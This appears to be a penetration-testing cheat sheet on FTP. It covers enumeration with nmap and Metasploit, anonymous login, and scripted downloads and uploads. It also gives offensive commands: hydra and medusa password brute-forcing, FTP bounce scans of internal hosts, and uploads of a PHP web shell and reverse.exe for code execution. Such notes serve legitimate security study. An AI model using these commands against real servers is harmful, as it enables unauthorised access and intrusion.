#FTP #FileTransferProtocol #filetransfer

## What is FTP?
File Transfer Protocol — used to transfer files between client and server. Unencrypted by default; FTPS (explicit/implicit TLS) and SFTP (SSH-based) are secure alternatives.

- Port **TCP 21** — command/control channel
- Port **TCP 20** — data channel (active mode)
- Passive mode: data channel port negotiated, client-initiated (firewall-friendly)
- Anonymous login common on older/misconfigured servers

---

## FTP Client Commands

| Command | Description |
|---|---|
| `connect <host>` | Connect to FTP server |
| `open <host>` | Open connection |
| `user <username>` | Set username |
| `get <file>` | Download file from server |
| `mget <pattern>` | Download multiple files |
| `put <file>` | Upload file to server |
| `mput <pattern>` | Upload multiple files |
| `ls` / `dir` | List remote directory |
| `cd <dir>` | Change remote directory |
| `lcd <dir>` | Change local directory |
| `pwd` | Print remote working directory |
| `binary` | Switch to binary transfer mode |
| `ascii` | Switch to ASCII transfer mode |
| `status` | Show connection status and settings |
| `debug` | Toggle debug mode |
| `trace` | Toggle packet tracing |
| `passive` | Toggle passive mode |
| `verbose` | Toggle verbose mode |
| `bye` / `quit` | Disconnect |

---

## Enumeration

```bash
# Nmap scripts
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-brute -sV <target>

# Check for anonymous login
nmap -p 21 --script ftp-anon <target>

# All FTP scripts
find / -type f -name "ftp*" 2>/dev/null | grep scripts

# Metasploit
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ftp/ftp_login
```

---

## Connect / Access

```bash
# Standard connection
ftp <target>
ftp -nv <target>  # suppress auto-login

# Anonymous login
# username: anonymous
# password: anonymous@domain.com (or anything)
ftp <target>
> anonymous
> anonymous@test.com

# Recursive download (wget)
wget -m --no-passive ftp://anonymous:anonymous@<target>

# wget all files
wget -r ftp://user:pass@<target>/
```

### SSL/TLS FTP

```bash
# Connect to FTPS
openssl s_client -connect <target>:21 -starttls ftp
openssl s_client -connect <target>:990  # Implicit FTPS

# Check cert — may contain hostname/domain
# lftp with TLS
lftp -e "set ssl:verify-certificate false" -u user,pass ftps://<target>
```

---

## Download Files

```bash
# Single file
ftp> get filename.txt

# Recursive download
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

# All files matching pattern
ftp> mget *.txt
```

---

## Upload Files

```bash
# Upload a file
ftp> put shell.php

# Upload with binary mode (for non-text)
ftp> binary
ftp> put reverse.exe
```

---

## Windows FTP via Command File

```cmd
# Download via command file (scriptable)
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

# Upload via command file
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT C:\path\to\file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Attack Vectors

### Brute Force

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target>
medusa -h <target> -u admin -P passwords.txt -M ftp
nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=pass.txt <target>
```

### FTP Bounce Attack

```bash
# Use FTP server as proxy to port scan internal hosts
nmap -p 80 -b anonymous:anonymous@<ftp_host> <internal_target>
nmap -Pn -v -n -p 80 -b ftp_user:ftp_pass@<ftp_host> <internal_target>
```

### Upload Web Shell (if FTP root = web root)

```bash
ftp> put shell.php
# Then access via browser: http://<target>/shell.php?cmd=id
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Anonymous login enabled | Unauthenticated file access/upload |
| FTP root = web root | Web shell upload leads to RCE |
| No TLS | Credentials and data in cleartext |
| Writable directories | File upload/replacement |
| `umask` too permissive | Uploaded files execute |

---

## Quick Reference

| Goal | Command |
|---|---|
| Anonymous login check | `nmap -p 21 --script ftp-anon host` |
| Connect | `ftp host` or `ftp -nv host` |
| Recursive download | `wget -m --no-passive ftp://anon:anon@host` |
| Upload file | `ftp> put shell.php` |
| Brute force | `hydra -l admin -P rockyou.txt ftp://host` |
| Bounce scan | `nmap -p 80 -b anon:anon@ftphost internalhost` |
| TLS connect | `openssl s_client -connect host:21 -starttls ftp` |
| Full nmap scan | `nmap -p 21 --script ftp-anon,ftp-bounce,ftp-brute` |
